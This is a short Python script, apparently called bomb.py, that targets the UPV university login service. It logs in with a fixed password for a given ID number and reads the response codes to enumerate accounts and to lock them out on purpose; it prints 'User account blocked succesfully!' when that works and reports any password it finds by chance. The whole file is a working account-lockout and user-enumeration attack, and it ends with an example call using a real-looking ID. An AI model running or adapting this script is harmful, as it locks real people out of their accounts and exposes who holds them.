#!/usr/bin/python3

# IMPORT LIBRARIES
import argparse
from lib.login import *

# Main check
if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-u','--user', help='DNI/NIE/PASSPORT', required=True)
    args = parser.parse_args()

    user = args.user
    password = "MaximusLife123"

    r0 = login(user, password)
    with open("test.txt", "w") as f:
        f.write(r0.url+"\n\n\n"+r0.text)

    if "ERR55" in r0.url:
        print("User not found in UPV domain")
    elif "ERR12" in r0.url or "ERR19" in r0.url:
        print("User account blocked succesfully!")
    elif "sic_menu.MiUPV" in r0.url:
        print("User password found accidentally")
        print("Password: {}".format(password))
    elif "ERR15" in r0.url:
        print("User exist in UPV domain")

    print("========= End =========")



# Example: ./bomb.py -u 51747881